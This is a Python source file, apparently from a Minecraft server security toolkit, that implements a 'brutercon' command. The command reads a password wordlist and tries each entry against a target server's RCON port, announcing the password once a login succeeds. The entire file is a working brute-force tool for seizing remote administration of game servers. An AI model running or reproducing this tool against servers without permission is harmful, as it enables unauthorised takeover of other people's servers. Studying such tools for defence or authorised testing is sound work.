import os

from loguru import logger
from mccolors import mcwrite
from mcrcon import MCRcon, MCRconException

from ..utilities.managers.language_utils import LanguageUtils as LM
from ..utilities.commands.validate import ValidateArgument
from ..utilities.minecraft.server.get_server import MCServerData, JavaServerData, BedrockServerData


class Command:
    @logger.catch
    def __init__(self):
        self.name: str = 'brutercon'
        self.arguments: list = [i for i in LM.get(f'commands.{self.name}.arguments')]
        self.passwords: list = []

    @logger.catch
    def validate_arguments(self, arguments: list) -> bool:
        """
        Method to validate the arguments

        Args:
            arguments (list): The arguments to validate

        Returns:
            bool: True if the arguments are valid, False otherwise
        """

        if not ValidateArgument.validate_arguments_length(command_name=self.name, command_arguments=self.arguments, user_arguments=arguments):
            return False

        if not ValidateArgument.is_ip_and_port(arguments[0]):
            mcwrite(LM.get('errors.invalidIpAndPort'))
            return False

        if not os.path.exists(arguments[1]):
            mcwrite(LM.get('errors.invalidFile'))
            return False

        return True

    @logger.catch
    def execute(self, arguments: list) -> None:
        """
        Method to execute the command

        Args:
            arguments (list): The arguments to execute the command
        """

        # Validate the arguments
        if not self.validate_arguments(arguments):
            return

        ip_address: str = arguments[0].split(':')[0]
        port: str = arguments[0].split(':')[1]
        password_file: str = arguments[1]

        # Getting the passwords
        mcwrite(LM.get(f'commands.{self.name}.gettingPasswords').replace('%file%', arguments[1]))

        with open(password_file, 'r') as file:
            self.passwords = file.read().splitlines()

        # Check if the password file is empty
        if len(self.passwords) == 0:
            mcwrite(LM.get(f'errors.passwordFileEmpty'))
            return

        # Start brute forcing to the rcon
        mcwrite(LM.get(f'commands.{self.name}.bruteForcing')
            .replace('%ip%', f'{ip_address}:{port}')
            .replace('%passwordFile%', password_file)
            .replace('%passwords%', str(len(self.passwords)))
        )

        for rcon_password in self.passwords:
            rcon_password = rcon_password.replace('\n', '')  # Remove the newline character

            try:
                with MCRcon(host=ip_address, password=rcon_password, port=int(port), timeout=30) as mcr:
                    mcwrite(LM.get(f'commands.{self.name}.passwordFound')
                        .replace('%password%', rcon_password)
                    )
                    return

            except TimeoutError:
                mcwrite(LM.get('errors.rconTimeout'))

            except ConnectionRefusedError:
                mcwrite(LM.get('errors.rconConnectionRefused'))

            except MCRconException:
                pass

            except Exception as e:
                mcwrite(LM.get('errors.rconUnknownError'))
                logger.error(f'Error in brutercon command: {e}')

        mcwrite(LM.get(f'commands.{self.name}.passwordNotFound'))